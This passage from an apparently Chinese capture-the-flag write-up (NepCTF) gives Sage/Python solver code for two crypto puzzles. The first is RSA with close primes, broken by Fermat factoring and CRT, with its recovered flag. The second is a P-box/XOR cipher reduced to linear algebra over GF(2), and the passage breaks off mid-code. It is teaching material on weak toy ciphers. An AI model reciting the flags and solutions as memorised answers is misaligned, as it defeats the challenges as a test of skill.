class="string">Here&#x27;s something for you.</span></span><br><span class="line"><span class="string">n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816</span></span><br><span class="line"><span class="string">c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解和CRT应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n =</span><br><span class="line">q = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    q = gmpy2.next_prime(q)</span><br><span class="line">    <span class="keyword">if</span> n%q == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">cp =</span><br><span class="line">cq =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = crt([cp,cq],[p,q])</span><br><span class="line">d = inverse_mod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="p-or-s"><a href="#p-or-s" class="headerlink" title="p or s"></a>p or s</h3><blockquote><p>本题flag格式: flag{xxx}</p><p>what are the differences between P and S？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(keys)==<span class="number">6</span>)</span><br><span class="line">Pbox=[</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">v</span>):</span><br><span class="line">    t=v</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">       q=[]</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> Pbox:</span><br><span class="line">           q.append(<span class="built_in">sum</span>([t[k] <span class="keyword">for</span> k <span class="keyword">in</span> j])%<span class="number">2</span>)</span><br><span class="line">       t=[<span class="built_in">int</span>(q[j])^<span class="built_in">int</span>(i[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">32</span>)</span><br><span class="line">fb=<span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:].zfill(<span class="number">32</span>*<span class="number">8</span>)</span><br><span class="line">ciphertext=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fb),<span class="number">32</span>):</span><br><span class="line">    t=enc([<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> fb[i:i+<span class="number">32</span>]])</span><br><span class="line">    ciphertext+=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> t])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：将flag二进制32*8位01串分为8组，每一组都先经过P盒按位选择求和运算，再与未知的32位key进行按位异或运算，因为有6组key，上述两步运算循环进行6次操作，得到最终32位密文。</p><p>将加密过程转为 $\text{GF}(2)$ 下的矩阵运算，$M_i$ 为 1x32 明文矩阵 $(0 \le i \lt 8)$，$P$ 为 32x32 P盒矩阵，$K_i$ 为 1x32 key矩阵 $(0 \le i \lt 6)$，$T_i$ 为中间矩阵 $(0 \le i \lt 6)$，$C$ 为密文矩阵，即：</p><p>$T_0=M_i$</p><p>$T_1=T_0P^{-1}+K_0$</p><p>$T_2=T_1P^{-1}+K_1$</p><p>$T_3=T_2P^{-1}+K_2$</p><p>$T_4=T_3P^{-1}+K_3$</p><p>$T_5=T_4P^{-1}+K_4$</p><p>$T_6=T_5P^{-1}+K_5=C$</p><p>可得：</p><p>$C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$</p><p>由于 $K_i$ 和 $P$ 都固定，令 $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$，</p><p>有 $C=M_iA+B$，其中 $A,B$ 都为固定值，$A$ 可求，$B$ 未知。</p><p>猜测 $M_0$ 对应的明文是 <code>flag</code>，则由 $M_0,C_0$可以得出 $B$，再对 $C_1$ 至 $C_5$ 分别求逆运算可得 $M_1$ 至 $M_5$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">P = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, 